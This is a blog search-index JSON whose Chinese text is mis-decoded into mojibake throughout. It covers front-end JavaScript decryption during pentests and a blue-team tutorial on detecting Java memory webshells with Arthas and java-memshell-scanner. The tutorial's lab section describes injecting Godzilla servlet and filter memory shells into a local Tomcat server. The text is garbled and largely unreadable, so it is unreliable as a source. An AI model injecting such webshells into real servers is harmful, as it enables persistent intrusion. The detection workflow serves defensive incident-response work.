è§£å¯†æ¥å£ï¼Œåˆ©ç”¨cdpåè®®å¯¹æ–­ç‚¹å¸§è¿›è¡Œè°ƒç”¨ã€‚ 1.å¯ç”¨node cdp.jså¯¹cdpç›‘å¬ã€‚ 2.ä½¿ç”¨pythonå»å¯åŠ¨è°ƒè¯•çš„webè¿›è¡Œè¿æ¥cdpã€‚ 3.æ‰“å¼€f12å®šå¥½æ–­ç‚¹,è¿è¡Œåˆ°æ–­ç‚¹ã€‚ 4.è°ƒç”¨åŠ è§£å¯†è¡¨è¾¾å¼ã€‚ 5.è§„åˆ’å¹¶å¡«å……è‡³ä¸­é—´ä»£ç†è„šæœ¬ã€‚ æ¡ˆä¾‹ï¼šCdpåè®®æ·±åº¦åº”ç”¨Webæ¸—é€åŠ è§£å¯† ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:7:2","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"å‚è€ƒæ–‡çŒ® ç½‘é¡µæ¥å£åŠ å¯†æš´ç ´â€”â€”d4mlts burpè‡ªå®šä¹‰è§£å¯†æ•°æ®æ’ä»¶ çƒ­åŠ è½½ã€çƒ­åŠ è½½åœºæ™¯æ¡ˆä¾‹ï¼šçˆ†ç ´aes cbcåŠ å¯†ã€YakitæŠ€èƒ½è”åŠ¨ï¼šcodec \u0026 WebFuzzer â€”â€” YAK yakitçƒ­åŠ è½½å¸¸ç”¨APIå­¦ä¹  JsRpcè”åŠ¨burpå®ç°è‡ªåŠ¨åŠ è§£å¯†ï¼ˆè¯¦ç»†ç‰ˆï¼‰ï¼šç”¨æ¡ˆä¾‹è®²è§£JsRpcï¼Œé…åˆBurp ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:8:0","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"æ–‡ä»¶å±æ€§ åˆ›å»ºæ—¶é—´ï¼š2025-06-04 22:19 ä¿®è®¢è®°å½•ï¼š 2025-06-04 ï¼Œæ­¤æ¬¡ä¿®è®¢å†…å®¹| æ–°å»º 2025-07-27 ï¼Œå®Œæˆ1.0ç‰ˆæœ¬ | ä¸Šä¼  å¤‡æ³¨ï¼š æ‹–å»¶ç—‡æ‹–å¤ªä¹…äº†ï¼Œè¿™æ–‡ç« å†™çš„è·ŸåŸæœ¬é¢„æœŸä¸å¤ªä¸€æ ·ï¼Œå¾ˆå¤šä¸œè¥¿æ²¡å¡«å……è¿›å»ï¼Œæ„Ÿè§‰æœ‰ç‚¹æ°´äº†ã€‚ æœ‰æœºä¼šå†æŠŠé‡Œé¢çš„ä¸€äº›æ–¹æ³•å…·ä½“æ‹¿å‡ºæ¥è¯´è¯´ï¼Œç€æ€¥å†™å®Œï¼Œä¸ç®¡äº†ï¼ˆç‹—å¤´ ğŸ¶ ï¼‰ã€‚ ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:9:0","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["åº”æ€¥å“åº”"],"content":"æœ¬æ–‡ä»¥å“¥æ–¯æ‹‰ä¸ºä¾‹ä¸»è¦è®²è§£å¯¹Filterç±»å’ŒServletç±»çš„æ’æŸ¥å¤„ç½®","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"ç®€è¿° å¤§å‹æ´¾å¯¹æ´»åŠ¨åœ¨å³ï¼Œå¯èƒ½ä¼šé‡åˆ°å†…å­˜é©¬åœºæ™¯ï¼Œæœ¬ç¯‡å†™ç»™å¯¹Javaä¸ç†Ÿæ‚‰çš„æœ‹å‹ï¼Œä¸ä¼šæ¶‰åŠå¾ˆå¤šæŠ€æœ¯ç»†èŠ‚ã€‚ å†…å­˜é©¬å†å²ï¼š å†…å­˜é©¬å†å²ä¹Ÿå¾ˆå¤šå¹´äº†ï¼Œç½‘ä¸Šæ–‡ç« ä¹Ÿå¾ˆå¤šï¼Œæ€»æœ‰èƒ½å¸®åŠ©åˆ°ä½ çš„ã€‚ å…¶å®å†…å­˜é©¬ç”±æ¥å·²ä¹…ï¼Œæ—©åœ¨17å¹´n1ntyå¸ˆå‚…çš„ã€ŠTomcatæºç è°ƒè¯•ç¬”è®°-çœ‹ä¸è§çš„shellã€‹ä¸­å·²åˆè§ç«¯å€ªï¼Œä½†ä¸€ç›´ä¸æ¸©ä¸ç«ã€‚ åç»è¿‡rebeyongå¸ˆå‚…ä½¿ç”¨agentæŠ€æœ¯åŠ æŒåï¼Œæ‹“å±•äº†å†…å­˜é©¬çš„ä½¿ç”¨åœºæ™¯ï¼Œç„¶ç»ˆåœç•™åœ¨å¥‡æŠ€æ·«å·§ä¸Šã€‚ åœ¨å„ç±»hwæ´—ç¤¼ä¹‹åï¼Œæ–‡ä»¶shellæ˜æ˜¾æ°”æ•°å·²å°½ã€‚å†…å­˜é©¬ä»¥æ•‘å‘½ç¨»è‰çš„èº«ä»½é‡å›å¤§ä¼—è§†é‡ã€‚ ç‰¹åˆ«æ˜¯ä»Šå¹´ï¼ˆ2020ï¼‰åœ¨shiroçš„å›æ˜¾ç ”ç©¶ä¹‹åï¼Œå¼•å‘äº†æ— æ•°å®‰å…¨ç ”ç©¶å‘˜å¯¹å†…å­˜webshellçš„ç ”ç©¶ï¼Œå…¶ä¸­æ¶Œç°å‡ºäº†LandGreyå¸ˆå‚…æ„é€ çš„Spring controllerå†…å­˜é©¬ã€‚ å†…å­˜é©¬ç®€è¿°ï¼š å¸¸è§„çš„WebshellåŸºäºæ–‡ä»¶ç±»å½¢å¼å­˜åœ¨ï¼Œè€Œå†…å­˜é©¬æ˜¯ä¸€ç§æ— æ–‡ä»¶æ”»å‡»æ‰‹æ®µï¼Œå› æ­¤ä¹Ÿè¢«ç§°ä¸ºä¸è½åœ°é©¬æˆ–è€…æ— æ–‡ä»¶é©¬ã€‚ å†…å­˜é©¬åœ¨è¯­è¨€ç±»å‹ä¸Šæœ‰PHPå†…å­˜é©¬ï¼ŒPythonå†…å­˜é©¬ï¼Œè€Œæœ¬æ–‡ä¸»è¦ä¾§é‡äºâ€œå¸‚åœºå æœ‰ç‡â€æœ€é«˜çš„javaå†…å­˜é©¬çš„æ£€æµ‹ä¸æŸ¥æ€ï¼Œjavaå†…å­˜é©¬ä¸»è¦åˆ†ä¸ºä¸‰å¤§ç±»å‹ï¼š servlet-apiç±»ï¼šfilterå‹ã€servletå‹ã€listenerå‹ springç±»ï¼šæ‹¦æˆªå™¨ã€controllerå‹ Java Instrumentationç±»ï¼šagentå‹ åŸç†ç®€è¿°ï¼š Java Servlet çš„å®ç°åŸç†ï¼Œå¦‚ä¸‹å›¾ï¼š å®¢æˆ·ç«¯å‘èµ·çš„webè¯·æ±‚ä¼šä¾æ¬¡ç»è¿‡Listenerã€Filterã€Servletä¸‰ä¸ªç»„ä»¶ï¼Œè€Œå†…å­˜é©¬åˆ©ç”¨åœ¨è¯·æ±‚è¿‡ç¨‹ä¸­åœ¨å†…å­˜ä¸­ä¿®æ”¹æˆ–åŠ¨æ€æ³¨å†Œæ–°çš„ç»„ä»¶ï¼Œè¾¾åˆ°æ³¨å…¥Webshellçš„ç›®çš„ã€‚ ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:1:0","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"ç¯å¢ƒå‡†å¤‡ æœ¬æ–‡ä¾§é‡åœ¨å†…å­˜é©¬æŸ¥æ€ï¼Œæˆ‘ä»¬å¯ä»¥å‡†å¤‡ä¸€ä¸ªç®€å•ç¯å¢ƒã€‚ Tomcatï¼Œæˆ‘ç”¨çš„æ˜¯ Tomcat 9.0.85 Webshellç®¡ç†å·¥å…·ï¼šå“¥æ–¯æ‹‰ã€å†°è å†…å­˜é©¬æ’æŸ¥å·¥å…·ï¼šArthasã€java-memshell-scanner é¦–å…ˆå¯åŠ¨TomcatæœåŠ¡å™¨ â”Œâ”€â”€(xavierğŸ’€X-AQ550M)-[~/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/bin] â””â”€$ chmod +x catalina.sh â”Œâ”€â”€(xavierğŸ’€X-AQ550M)-[~/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/bin] â””â”€$ ./catalina.sh start Using CATALINA_BASE: /Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2 Using CATALINA_HOME: /Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2 Using CATALINA_TMPDIR: /Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/temp Using JRE_HOME: /Library/Java/JavaVirtualMachines/jdk-18.0.2.jdk/Contents/Home Using CLASSPATH: /Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/bin/bootstrap.jar:/Users/xavier/CodeSpace/Tomcat/apache-tomcat-9.0.85-2/bin/tomcat-juli.jar Using CATALINA_OPTS: Tomcat started. ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:2:0","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"æŸ¥æ€æ€è·¯ æˆ‘ä»¬éœ€è¦äº†è§£çš„æ˜¯å¦‚ä½•å»å¿«é€Ÿç¡®è®¤å†…å­˜é©¬æ˜¯å¦å­˜åœ¨ï¼Œå¦‚ä½•ç¡®å®šå…¶ä½ç½®ï¼Œå¦‚ä½•è¿›è¡Œæ¸…é™¤ã€‚ æ¶ˆæ¯æ¥æºï¼šä¸ºä»€ä¹ˆæ€€ç–‘æœ‰å†…å­˜é©¬ï¼Œé€šå¸¸æ˜¯ä»¥ä¸‹é›†ä¸­æƒ…å†µï¼š æµé‡è®¾å¤‡çš„å†…å­˜é©¬å‘Šè­¦ï¼Œæœ‰å…·ä½“è¯·æ±‚çš„uriå¯ä»¥è¾…åŠ©åé¢æ’æŸ¥ ä¸»æœºé˜²æŠ¤çš„å¯ç–‘å‘½ä»¤å‘Šè­¦ï¼Œ æœåŠ¡å™¨çªç„¶è¿›è¡Œæ¨ªå‘æ”»å‡»æ‰«æ å…¶ä»–äººå·¥ä¸ŠæŠ¥ï¼šæ¯”å¦‚æœåŠ¡å™¨æ€§èƒ½å¼‚å¸¸ï¼ŒæŸäº›æ¥å£è®¿é—®å¼‚å¸¸ç­‰ã€‚ æ’æŸ¥æ€è·¯ï¼š å¼„æ¸…æ¥šå½“å‰ç¯å¢ƒçš„æœåŠ¡æ¶æ„ï¼šä¸­é—´ä»¶ã€ç»„ä»¶ã€æ¡†æ¶ç­‰ æ—¥å¿—æ’æŸ¥ï¼šæ’æŸ¥æœåŠ¡å™¨webæ—¥å¿—ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘çš„webè®¿é—®æ—¥å¿—ï¼Œæ¯”å¦‚æœ‰å¤§é‡è¯·æ±‚URLè·¯å¾„ç›¸åŒä½†å‚æ•°ä¸åŒçš„ï¼Œæˆ–è€…é¡µé¢ä¸å­˜åœ¨ä½†æ˜¯è¿”å›200çš„è¯·æ±‚ï¼Œæˆ–è€…åŒä¸€ä¸ªURLè¯·æ±‚æœ‰å¤§é‡è®¿é—®è®°å½•ä¸º500ç­‰ç­‰ã€‚ ä¸­é—´ä»¶æ’æŸ¥ï¼šå¦‚æœwebæ—¥å¿—æœªå‘ç°å¼‚å¸¸ï¼Œå¯ä»¥æ’æŸ¥æ˜¯å¦ä¸ºä¸­é—´ä»¶æ¼æ´å¯¼è‡´ä»£ç æ‰§è¡Œæ³¨å…¥å†…å­˜é©¬ï¼Œæ’æŸ¥ä¸­é—´ä»¶çš„error.logæ—¥å¿—æŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘çš„æŠ¥é”™ï¼Œæ ¹æ®æ³¨å…¥æ—¶é—´å’Œæ–¹æ³•ï¼Œæ ¹æ®ä¸šåŠ¡ä½¿ç”¨çš„ç»„ä»¶æ’æŸ¥æ˜¯å¦å¯èƒ½å­˜åœ¨javaä»£ç æ‰§è¡Œæ¼æ´ä»¥åŠæ˜¯å¦å­˜åœ¨è¿‡webshellï¼Œæ’æŸ¥æ¡†æ¶æ¼æ´ï¼Œååºåˆ—åŒ–æ¼æ´ã€‚ æŸ¥çœ‹æ˜¯å¦æœ‰ç±»ä¼¼å“¥æ–¯æ‹‰ã€å†°èç‰¹å¾çš„urlè¯·æ±‚ï¼Œå“¥æ–¯æ‹‰å’Œå†°èçš„å†…å­˜é©¬æ³¨å…¥æµé‡ç‰¹å¾ä¸æ™®é€šwebshellçš„æµé‡ç‰¹å¾åŸºæœ¬å»åˆã€‚ é€šè¿‡æŸ¥æ‰¾è¿”å›200çš„urlè·¯å¾„å¯¹åº”çš„webç›®å½•ä¸‹æ˜¯å¦çœŸå®å­˜åœ¨æ–‡ä»¶ï¼Œå¦‚ä¸å­˜åœ¨å¤§æ¦‚ç‡ä¸ºå†…å­˜é©¬ã€‚ ä¸Šè¿°æ˜¯å¤§è‡´æ€è·¯ï¼Œæ¥ä¸‹å»è¦è¿›è¡Œå…·ä½“æ’æŸ¥åˆ†æï¼Œå°±éœ€è¦é€‰æ‹©åˆé€‚çš„å·¥å…·è¿›è¡Œåˆ†æã€‚ ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:3:0","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"æŸ¥æ€æ£€æµ‹å·¥å…· æœ¬æ–‡ä¸»è¦è®²è§£ä½¿ç”¨ java-memshell-scannerã€Arthasè¿›è¡Œå†…å­˜é©¬æ’æŸ¥ï¼Œå…¶ä»–çš„å¯è‡ªè¡Œè¯•éªŒã€‚ é¦–å…ˆæˆ‘ä»¬åœ¨ä¸æ³¨å…¥å†…å­˜é©¬çš„æƒ…å†µä¸‹ï¼Œå…ˆä½¿ç”¨å·¥å…·æŸ¥çœ‹ä¸€ä¸‹å½“å‰çŠ¶æ€ ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:4:0","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"java-memshell-scanner java-memshell-scannerï¼Œc0ny1å¸ˆå‚…ç¼–å†™çš„jspå†…å­˜é©¬æ£€æµ‹è„šæœ¬ï¼Œé€šè¿‡jspè„šæœ¬æ‰«æå¹¶æŸ¥æ€å„ç±»ä¸­é—´ä»¶å†…å­˜é©¬ï¼Œæ¯” Java agent è¦æ¸©å’Œä¸€äº›ã€‚ è¯¥è„šæœ¬çš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œå°† java-memshell-scanner è„šæœ¬æ”¾åœ¨èƒ½è®¿é—®çš„webè·¯å¾„ä¸‹ï¼Œç„¶åç›´æ¥è®¿é—®å°±å¯ä»¥è·å¾—ç»“æœã€‚æ”¯æŒFilterç±»å’ŒServletç±»å†…å­˜é©¬æŸ¥æ€ã€‚ å°†java-memshell-scannerä¸‹çš„tomcat-memshell-scanner.jspå¤åˆ¶åˆ°ç½‘ç«™ç›®å½•ä¸‹ï¼Œ â”Œâ”€â”€(xavierğŸ’€X-AQ550M)-[~/â€¦/Tomcat/apache-tomcat-9.0.85-2/webapps/ROOT] â””â”€$ ll total 384 -rw-r--r--@ 1 xavier staff 27530 1 5 2024 asf-logo-wide.svg -rw-r--r--@ 1 xavier staff 713 1 5 2024 bg-button.png -rw-r--r--@ 1 xavier staff 1918 1 5 2024 bg-middle.png -rw-r--r--@ 1 xavier staff 1401 1 5 2024 bg-nav.png -rw-r--r--@ 1 xavier staff 3103 1 5 2024 bg-upper.png -rw-r--r--@ 1 xavier staff 21630 1 5 2024 favicon.ico -rw-r--r--@ 1 xavier staff 12453 1 5 2024 index.jsp -rw-r--r--@ 1 xavier staff 7075 1 5 2024 RELEASE-NOTES.txt -rw-r--r--@ 1 xavier staff 1092 6 17 23:20 shell01.jsp -rw-rw-r--@ 1 xavier staff 16876 10 13 2020 tomcat-memshell-scanner.jsp -rw-r--r--@ 1 xavier staff 5895 1 5 2024 tomcat.css -rw-r--r--@ 1 xavier staff 68761 1 5 2024 tomcat.svg drwxr-xr-x@ 3 xavier staff 96 1 5 2024 WEB-INF é€šè¿‡Webç«¯è¿›è¡Œè®¿é—®ï¼Œå¯ä»¥çœ‹å¾—åªæœ‰é»˜è®¤çš„Tomcat filterå’Œservletã€‚ ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:4:1","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"Arthas Arthasï¼ŒArthasæ˜¯ä¸€æ¬¾å¼€æºçš„Javaè¯Šæ–­å·¥å…·ï¼ŒåŸºæœ¬ä½¿ç”¨åœºæ™¯æ˜¯å®šä½å¤ç°ä¸€äº›ç”Ÿäº§ç¯å¢ƒæ¯”è¾ƒéš¾ä»¥å®šä½é—®é¢˜ã€‚å¯ä»¥åœ¨çº¿æ’æŸ¥é—®é¢˜ï¼Œä»¥åŠåŠ¨æ€è¿½è¸ªJavaä»£ç ï¼Œå®æ—¶ç›‘æ§JVMçŠ¶æ€ç­‰ç­‰ã€‚ å¯åŠ¨ java -jar .\\arthas-boot.jar #javaåº”ç”¨è¿›ç¨‹PID æŸ¥çœ‹å½“å‰çš„Servletã€Filterã€Listener å¸¸ç”¨å‘½ä»¤ è¾“å…¥Mbean æŸ¥çœ‹æˆ–ç›‘æ§ Mbean çš„å±æ€§ä¿¡æ¯ï¼Œæ ¹æ®å†…å­˜é©¬çš„ç‰¹æ€§ï¼Œè¿›è¡Œç­›é€‰å‡ºå¼‚å¸¸ç»„ä»¶ï¼Œ 1.æŸ¥çœ‹URLè·¯ç”±ï¼ˆçœ‹Servletå†…å­˜é©¬ï¼‰ å†…å­˜é©¬è®¿é—®è§¦å‘ç‰¹å¾ï¼šURLåœ°å€è·¯å¾„åœ¨æºç ä¸­ä¸å­˜åœ¨ [arthas@38043]$ mbean | grep \"name=/\" [arthas@38043]$ mbean | grep Servlet [arthas@38043]$ mbean | grep Filter [arthas@38043]$ mbean | grep Listener æŸ¥çœ‹ Mbean çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹å¼‚å¸¸Filterã€Servletã€ListenerèŠ‚ç‚¹ 2. scæŸ¥çœ‹JVM å·²åŠ è½½çš„ç±»ä¿¡æ¯ sc #(æŸ¥çœ‹JVMå·²åŠ è½½çš„ç±»ä¿¡æ¯) sc xxx.* #æ¨¡ç³Šæœç´¢ç±» sc *.xxx #æ”¯æŒå„ç§ç±»å‹ sc *.Filter #æœç´¢ç¬¦åˆpatternçš„Filter sc *.Servlet sc *.Listener #Springæ¡†æ¶å†…å­˜é©¬ sc * | grep Controller sc * | grep Interceptor æ ¹æ®ç±»ååˆ¤æ–­ï¼Œæœç´¢æ˜¯å¦æœ‰ç›¸å…³èµ„æ–™ï¼Œè‹¥æ²¡æœ‰åˆ™ä¸‹è½½å…¶æºç ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰åé—¨ï¼Œä¹Ÿå¯ç›´æ¥ä¸Šä¼ å¾®æ­¥åœ¨çº¿ æŸ¥çœ‹æŸç±»åŠ è½½çš„ç±»ä¿¡æ¯ sc -d \u003cclass_name\u003e # æŸ¥çœ‹x.AES_BASE64ç±»åŠ è½½çš„ç±»ä¿¡æ¯ sc -d payload x.AES_BASE64 sc -d org.apache.jsp.tomcat_002dmemshell_002dscanner_jsp åç¼–è¯‘æŒ‡å®šç±» jad --source-only \u003cclass_name\u003e jad --source-only org.apache.jsp.memshell_jsp #åç¼–è¯‘æŒ‡å®šç±» åç¼–è¯‘è¾“å‡ºçš„ç»“æœèƒ½æŸ¥çœ‹åˆ°å†…å­˜é©¬çš„æ¶æ„è¯­å¥ dumpå·²åŠ è½½ç±»çš„å­—èŠ‚ç  #dumpå·²åŠ è½½ç±»çš„bytecodeåˆ°ç‰¹å®šç›®å½• dump org.apache.coyote.type.PlaceholderForType ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:4:2","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"å…¶ä»–å·¥å…· aLIEzï¼Œå†…å­˜é©¬æŸ¥æ€å·¥å…·ï¼Œé‡‡ç”¨åå°„åŠ¨æ€åŠ è½½JDKä¾èµ–ï¼Œä¸ä¼šç›´æ¥transformerå»æ”¹bytecodeï¼Œ ç°åœ¨æ˜¯ç›´æ¥dumpå‡ºæ¥ä¾èµ–ç ”ç©¶äººå‘˜è‡ªå·±åˆ†æã€‚æ€å„ä¸ªJavaEEå®¹å™¨ã€ä¸­é—´ä»¶çš„å†…å­˜é©¬ copagentï¼šè‡ªåŠ¨æå–é¡¹ç›® éœ€è¦è‡ªå·±æ’æŸ¥ï¼Œèƒ½æ’æŸ¥å‡ ä¹ä¸»æµå†…å­˜é©¬æŠ€æœ¯ FindShellï¼šå†…å­˜é©¬æŸ¥æ€å·¥å…·ï¼Œå°¤å…¶é’ˆå¯¹Agentå‹ï¼ŒåŸç†æ˜¯dumpå‡ºJVMå½“å‰çš„classå¹¶è¿›è¡Œå­—èŠ‚ç åˆ†æï¼Œå¹¶åŠ å…¥è‡ªåŠ¨ä¿®å¤çš„åŠŸèƒ½ NoAgent-memshell-scannerï¼ŒNoAgentå†…å­˜é©¬æ£€æµ‹ç¨‹åºï¼Œæ”¯æŒæ£€æµ‹ agentå‹å†…å­˜é©¬ã€tomcat filter/servlet/listener/valveå‹å†…å­˜é©¬ã€spring interceptor,controllerå‹å†…å­˜é©¬ï¼Œæ”¯æŒéagentå‹å†…å­˜é©¬çš„åˆ é™¤åŠŸèƒ½ã€‚ shell-analyzerï¼Œä¸€æ¬¾GUIç‰ˆæœ¬çš„å®æ—¶å†…å­˜é©¬æŸ¥æ€å·¥å…·ï¼Œæ”¯æŒæœ¬åœ°æŸ¥æ€ä¸è¿œç¨‹æŸ¥æ€ï¼› ä»…æµ‹è¯•äº†Tomcatè¿™ä¸€ç§ä¸­é—´ä»¶ï¼Œä¸è¿‡ç†è®ºä¸Šä»»ä½•å®ç°äº†Servletè§„èŒƒçš„ä¸­é—´ä»¶éƒ½å¯ä»¥æŸ¥æ€ ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:4:3","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"æ¡ˆä¾‹-å“¥æ–¯æ‹‰å†…å­˜é©¬ ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:5:0","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"æ³¨å…¥å†…å­˜é©¬ å“¥æ–¯æ‹‰ç”Ÿæˆæ™®é€šçš„Webshellï¼Œå°†shell01.jspæ”¾åˆ°Tomcat Webç›®å½•ä¸‹ é€šè¿‡å“¥æ–¯æ‹‰è¿æ¥Webshellï¼Œè¿æ¥æ­£å¸¸ï¼Œ å³é”®è¿›å…¥ï¼Œåœ¨shellé¡µé¢é€‰æ‹©å†…å­˜é©¬MemoryShell æˆ– FilterShellï¼Œé€‰æ‹©ç›¸åº”çš„ç±»å‹è¿›è¡Œæ‰§è¡Œã€‚ å“¥æ–¯æ‹‰å†…å­˜é©¬æ˜¯servletå‹å’Œfilterå‹ï¼Œè¿™ä¸¤ç§ç›¸å¯¹æ¯”è¾ƒå¥½æ’æŸ¥ã€‚ æ³¨å…¥Servletå‹ æ³¨å…¥å‰å¯ä»¥å…ˆé€‰æ‹© ServletManage ç‚¹å‡» getAllServletï¼ŒæŸ¥çœ‹ä¸‹å½“å‰çš„çŠ¶æ€ é€šè¿‡MemoryShellï¼Œè®¾ç½®å¥½é€‰é¡¹åï¼Œç‚¹å‡» run è¿›è¡Œæ³¨å…¥ æ³¨å…¥åå†æ¬¡ç‚¹å‡» ServletManageï¼Œç‚¹å‡» getAllServletï¼ŒæŸ¥çœ‹ä¸‹å½“å‰çš„çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°æ–°å¢äº†ä¸€æ¡ã€‚ æ³¨å…¥Filterå‹ æ³¨å…¥å‰å¯ä»¥å…ˆç‚¹å‡» getAllFilterï¼ŒæŸ¥çœ‹ä¸‹å½“å‰çš„çŠ¶æ€ é€šè¿‡ç‚¹å‡» addFilterShell è¿›è¡Œæ³¨å…¥ æ³¨å…¥åå†æ¬¡ç‚¹å‡» getAllFilterï¼ŒæŸ¥çœ‹ä¸‹å½“å‰çš„çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°æ–°å¢äº†ä¸€æ¡ã€‚ ","date":"2025-06-25","objectID":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/:5:1","tags":["BlueTeam"],"title":"å†…å­˜é©¬æŸ¥æ€ç¬”è®°-å…¥é—¨ç‰ˆ","uri":"/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%AC%94%E8%AE%B0/"},{"categories":["åº”æ€¥å“åº”"],"content":"java-memshell-scanneræ’æŸ¥ é€šè¿‡è®¿é—® /tomcat-memshell-scanner.jsp å³å¯è¿›è¡Œæ’æŸ¥ï¼Œå¯ä»¥çœ‹åˆ°æ–°å¢çš„ä¸¤æ¡éƒ½è¢«æ‰¾åˆ°äº†ã€‚ http://localhost:8080/tomcat-memshell-scanner.jsp é€šè¿‡dumpå¯ä»¥ä¸‹è½½ç›¸åº”çš„classç±»è¿›è¡Œåˆ†æï¼Œç‚¹å‡»Killå³å¯åˆ é™¤ç›¸åº”å†…å­˜é©¬ã€‚ 